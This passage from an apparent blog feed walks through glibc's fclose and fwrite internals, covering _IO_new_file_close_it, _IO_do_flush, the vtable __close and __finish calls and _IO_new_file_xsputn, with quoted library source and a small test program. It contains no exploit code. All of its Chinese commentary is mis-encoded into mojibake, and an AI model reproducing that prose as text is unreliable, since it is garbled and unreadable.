ç¼“å†²åŒºæ•°æ®å†™å›æ–‡ä»¶ï¼Œé‡Šæ”¾ç¼“å†²åŒºï¼Œå…³é—­æ–‡ä»¶</h3><p><strong>libio&#x2F;fileops.c</strong></p><p>è¿”å›_IO_new_fclose è°ƒç”¨_IO_file_close_it (fp);</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_close_it _IO_file_close_it</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_close_it (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> write_status;</span><br><span class="line">  <span class="keyword">if</span> (!_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="number">0</span>)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write_status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  _IO_unsave_markers (fp);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="number">0</span></span><br><span class="line">              ? _IO_SYSCLOSE (fp) : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free buffer. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_wbackup (fp))</span><br><span class="line">    _IO_free_wbackup_area (fp);</span><br><span class="line">      _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">      _IO_wsetg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">      _IO_wsetp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  _IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  _IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);<span class="comment">//å†æ¬¡ç¡®ä¿è„±é“¾</span></span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">  fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">  fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_status ? close_status : write_status;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_close_it, _IO_file_close_it)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ£€æµ‹ä¸å¯å†™æ ‡å¿—(0x8)ï¼Œå†æ£€æµ‹<code>_IO_CURRENTLY_PUTTING(0x800)</code>æ–‡ä»¶æ˜¯å¦å¤„äºè¾“å‡ºçŠ¶æ€ã€‚</p><p>åœ¨fwriteä¸­è®¾ç½®äº†_IO_CURRENTLY_PUTTINGæ ‡å¿—ä½</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401224153932.png" alt="image-20230401224153932"></p><img src="/2023/04/01/IO-FILE-fclose/image-20230401224234824.png" alt="image-20230401224234824" style="zoom:67%;"><h4 id="IO-do-flush-fp-ç¼“å†²åŒºæ•°æ®å†™å›æ–‡ä»¶"><a href="#IO-do-flush-fp-ç¼“å†²åŒºæ•°æ®å†™å›æ–‡ä»¶" class="headerlink" title="_IO_do_flush (fp) ç¼“å†²åŒºæ•°æ®å†™å›æ–‡ä»¶"></a>_IO_do_flush (fp) ç¼“å†²åŒºæ•°æ®å†™å›æ–‡ä»¶</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \</span></span><br><span class="line"><span class="meta">           (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">      || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">               &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">               ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œfwriteé‡Œåˆ†æçš„ä¸€æ ·_IO_SYSWRITEè°ƒç”¨äº†<mark>&#x3D;&#x3D;vtableä¸­__writeå¯¹åº”çš„<code>_IO_new_file_write</code>&#x3D;&#x3D;<mark></mark></mark></p><p>å†™å…¥æ–‡ä»¶å¹¶ï¼Œåˆ·æ–°è¾“å‡ºç¼“å†²åŒºçš„å€¼</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401230150953.png" alt="image-20230401230150953"></p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401230235192.png" alt="image-20230401230235192"></p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401230304718.png" alt="image-20230401230304718"></p><h4 id="IO-SYSCLOSE-fp-å…³é—­æ–‡ä»¶"><a href="#IO-SYSCLOSE-fp-å…³é—­æ–‡ä»¶" class="headerlink" title="_IO_SYSCLOSE(fp) å…³é—­æ–‡ä»¶"></a>_IO_SYSCLOSE(fp) å…³é—­æ–‡ä»¶</h4><p>å›åˆ°_IO_new_file_close_it</p><blockquote><p><code>_IO_FLAGS2_NOCLOSE(32)</code>è¡¨ç¤ºä¸€ä¸ªæµä¸åº”è¯¥è¢« <code>fclose()</code> å‡½æ•°å…³é—­ã€‚ä¸ºæµè®¾ç½® <code>_IO_FLAGS2_NOCLOSE</code> æ ‡å¿—å°†é˜²æ­¢ <code>fclose()</code> å‡½æ•°å…³é—­ä¸æµç›¸å…³è”çš„æ–‡ä»¶æè¿°ç¬¦ã€‚è¿™åœ¨æ–‡ä»¶æè¿°ç¬¦æ­£åœ¨è¢«ç¨‹åºçš„å…¶ä»–éƒ¨åˆ†ä½¿ç”¨æˆ–æµæ­£åœ¨ç”¨äºä¸éœ€è¦æ–‡ä»¶æè¿°ç¬¦ä¿æŒæ‰“å¼€çŠ¶æ€çš„è®¾å¤‡è¿›è¡Œé€šä¿¡çš„æƒ…å†µä¸‹éå¸¸æœ‰ç”¨</p></blockquote><p>è°ƒç”¨_IO_SYSCLOSE(fp)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSCLOSE(FP) JUMP0 (__close, FP)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;è™šè¡¨ä¸­çš„__closeï¼Œå³_IO_file_closeå‡½æ•°&#x3D;&#x3D;<mark></mark></mark></p><p><strong>&#x2F;libio&#x2F;fileops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_close (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Cancelling close should be avoided if possible since it leaves an</span></span><br><span class="line"><span class="comment">     unrecoverable state behind.  */</span></span><br><span class="line">  <span class="keyword">return</span> close_not_cancel (fp-&gt;_fileno);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> close_not_cancel(fd) \</span></span><br><span class="line"><span class="meta">  __close (fd)</span></span><br></pre></td></tr></table></figure><img src="/2023/04/01/IO-FILE-fclose/image-20230401232801039.png" alt="image-20230401232801039" style="zoom:80%;"><p>ç›´æ¥ç³»ç»Ÿè°ƒç”¨closeå…³é—­æ–‡ä»¶</p><h4 id="é”€æ¯æ–‡ä»¶æµç»“æ„ä½“å†…å®¹-é‡Šæ”¾ç¼“å†²åŒº"><a href="#é”€æ¯æ–‡ä»¶æµç»“æ„ä½“å†…å®¹-é‡Šæ”¾ç¼“å†²åŒº" class="headerlink" title="é”€æ¯æ–‡ä»¶æµç»“æ„ä½“å†…å®¹,é‡Šæ”¾ç¼“å†²åŒº"></a>é”€æ¯æ–‡ä»¶æµç»“æ„ä½“å†…å®¹,é‡Šæ”¾ç¼“å†²åŒº</h4><p>å›åˆ°**_IO_new_file_close_it**_mode&#x3D;-1ä¸ç¬¦åˆæ¡ä»¶</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">_IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">_IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡Šæ”¾ç¼“å†²åŒºï¼Œ_IO_buf_baseï¼Œ_IO_buf_endç½®ç©ºï¼Œè®¾ç½®_IO_USER_BUFä½åŸŸ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="meta">    (fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setp(__fp, __p, __ep) \</span></span><br><span class="line"><span class="meta">       ((__fp)-&gt;_IO_write_base = (__fp)-&gt;_IO_write_ptr \</span></span><br><span class="line"><span class="meta">    = __p, (__fp)-&gt;_IO_write_end = (__ep))</span></span><br></pre></td></tr></table></figure><p>macroå±•å¼€å</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((fp)-&gt;_IO_read_base = (<span class="literal">NULL</span>), (fp)-&gt;_IO_read_ptr = (<span class="literal">NULL</span>), (fp)-&gt;_IO_read_end = (<span class="literal">NULL</span>));</span><br><span class="line">((fp)-&gt;_IO_write_base = (fp)-&gt;_IO_write_ptr = <span class="literal">NULL</span>, (fp)-&gt;_IO_write_end = (<span class="literal">NULL</span>));</span><br></pre></td></tr></table></figure><p>æŠŠread writeç›¸å…³ç¼“å†²åŒºæŒ‡é’ˆç½®ç©º</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">fp-&gt;_offset = _IO_pos_BAD;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401235020311.png" alt="image-20230401235020311"></p><h3 id="ç¡®è®¤æ–‡ä»¶å…³é—­ï¼Œé‡Šæ”¾æ–‡ä»¶æµç»“æ„ä½“å†…å­˜"><a href="#ç¡®è®¤æ–‡ä»¶å…³é—­ï¼Œé‡Šæ”¾æ–‡ä»¶æµç»“æ„ä½“å†…å­˜" class="headerlink" title="ç¡®è®¤æ–‡ä»¶å…³é—­ï¼Œé‡Šæ”¾æ–‡ä»¶æµç»“æ„ä½“å†…å­˜"></a>ç¡®è®¤æ–‡ä»¶å…³é—­ï¼Œé‡Šæ”¾æ–‡ä»¶æµç»“æ„ä½“å†…å­˜</h3><h3 id="IO-new-file-finish"><a href="#IO-new-file-finish" class="headerlink" title="IO_new_file_finish"></a>IO_new_file_finish</h3><p>å›åˆ° <strong>_IO_new_fclose</strong> _IO_FINISH (fp);</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FINISH(FP) JUMP1 (__finish, FP, 0)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;è™šè¡¨ä¸­çš„_finishï¼Œå¯¹åº”_IO_new_file_finishå‡½æ•°&#x3D;&#x3D;<mark></mark></mark></p><p><strong>libio&#x2F;fileops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_do_flush (fp);</span><br><span class="line">      <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))</span><br><span class="line">    _IO_SYSCLOSE (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_is_open(__fp) ((__fp)-&gt;_fileno != -1)</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥æ¥åˆ°_IO_default_finish(fp)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_default_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *<span class="title">mark</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (mark = fp-&gt;_markers; mark != <span class="literal">NULL</span>; mark = mark-&gt;_next)</span><br><span class="line">    mark-&gt;_sbuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_save_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_fini (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_finish)</span><br></pre></td></tr></table></figure><p>éƒ½ä¸ç¬¦åˆè¦æ±‚æ¥åˆ°_IO_un_link<code>if (fp-&gt;file._flags &amp; _IO_LINKED)</code>ä¸ç¬¦åˆï¼Œè¿”å›_IO_new_fclose</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">  &#123;</span><br><span class="line">    fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(fp);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ç½®é›¶åé‡Šæ”¾æ–‡ä»¶æµç»“æ„ä½“å†…å­˜</p><h2 id="closeå‡½æ•°è°ƒç”¨çš„vtableå‡½æ•°"><a href="#closeå‡½æ•°è°ƒç”¨çš„vtableå‡½æ•°" class="headerlink" title="closeå‡½æ•°è°ƒç”¨çš„vtableå‡½æ•°"></a><code>close</code>å‡½æ•°è°ƒç”¨çš„vtableå‡½æ•°</h2><ul><li>åœ¨æ¸…ç©ºç¼“å†²åŒºçš„<code>_IO_do_write</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨vtableä¸­<code>__write</code>å¯¹åº”çš„<code>_IO_new_file_write</code>çš„å‡½æ•°ã€‚</li><li>å…³é—­æ–‡ä»¶æè¿°ç¬¦<code>_IO_SYSCLOSE</code>å‡½æ•°ä¸º<code>_close</code>ï¼Œå³<code>_IO_file_close</code>å‡½å‡½æ•°ã€‚</li><li><code>_IO_FINISH</code>å‡½æ•°ä¸ºvtable _finishï¼Œå¯¹åº”<code>_IO_new_file_finish</code>å‡½æ•°</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fwrite</title>
      <link href="/2023/04/01/IO-FILE-fwrite/"/>
      <url>/2023/04/01/IO-FILE-fwrite/</url>
      
        <content type="html"><![CDATA[<h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE* stream)</span>;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç¨‹åº</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">20</span>]=<span class="string">&quot;flag&#123;grxer&#125;&quot;</span>;</span><br><span class="line">    FILE*fp=fopen(<span class="string">&quot;./flag1&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fwrite(data,<span class="number">1</span>,<span class="number">20</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x2F-libio-x2F-iofwrite-c-IO-fwrite"><a href="#x2F-libio-x2F-iofwrite-c-IO-fwrite" class="headerlink" title="&#x2F;libio&#x2F;iofwrite.c _IO_fwrite"></a><strong>&#x2F;libio&#x2F;iofwrite.c _IO_fwrite</strong></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t request = size * count;</span><br><span class="line">  _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>CHECK_FILE</strong>æ£€æµ‹ä¸€ä¸‹flagçš„é­”æ•°ï¼ŒåŠ é”åˆ¤æ–­</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> _IO_fwide(__fp, __mode) \</span></span><br><span class="line"><span class="meta">  (&#123; int __result = (__mode);                              \</span></span><br><span class="line"><span class="meta">     <span class="keyword">if</span> (__result &lt; 0 &amp;&amp; ! _IO_fwide_maybe_incompatible)              \</span></span><br><span class="line"><span class="meta">       &#123;                                      \</span></span><br><span class="line"><span class="meta">     <span class="keyword">if</span> ((__fp)-&gt;_mode == 0)      \</span></span><br><span class="line"><span class="meta">       <span class="comment">/* We know that all we have to do is to set the flag.  */</span>      \</span></span><br><span class="line"><span class="meta">       (__fp)-&gt;_mode = -1;      \</span></span><br><span class="line"><span class="meta">     __result = (__fp)-&gt;_mode;      \</span></span><br><span class="line"><span class="meta">       &#125;                                      \</span></span><br><span class="line"><span class="meta">     <span class="keyword">else</span> <span class="keyword">if</span> (__builtin_constant_p (__mode) &amp;&amp; (__mode) == 0)              \</span></span><br><span class="line"><span class="meta">       __result = _IO_fwide_maybe_incompatible ? -1 : (__fp)-&gt;_mode;          \</span></span><br><span class="line"><span class="meta">     <span class="keyword">else</span>                                      \</span></span><br><span class="line"><span class="meta">       __result = _IO_fwide (__fp, __result);                      \</span></span><br><span class="line"><span class="meta">     __result; &#125;)</span></span><br></pre></td></tr></table></figure><p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401120543002.png" alt="image-20230401120543002"></p><h3 id="è¿›å…¥-IO-sputnï¼Œ"><a href="#è¿›å…¥-IO-sputnï¼Œ" class="headerlink" title="è¿›å…¥_IO_sputnï¼Œ"></a>è¿›å…¥_IO_sputnï¼Œ</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;è°ƒç”¨vtableé‡Œ**__xsputn<strong>æŒ‡å‘çš„</strong>libio&#x2F;fileops.cé‡Œçš„_IO_new_file_xsputn**å‡½æ•°ï¼Œä¼ å…¥çš„å‚æ•°ä¸ºæ–‡ä»¶æµç»“æ„ä½“_IO_FILE,æ•°æ®ç›®æ ‡åœ°å€ï¼Œè¯»å–æ€»å­—èŠ‚æ•°&#x3D;&#x3D;<mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">      <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          count = p - s + <span class="number">1</span>;</span><br><span class="line">          must_flush = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">    count = to_do;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span 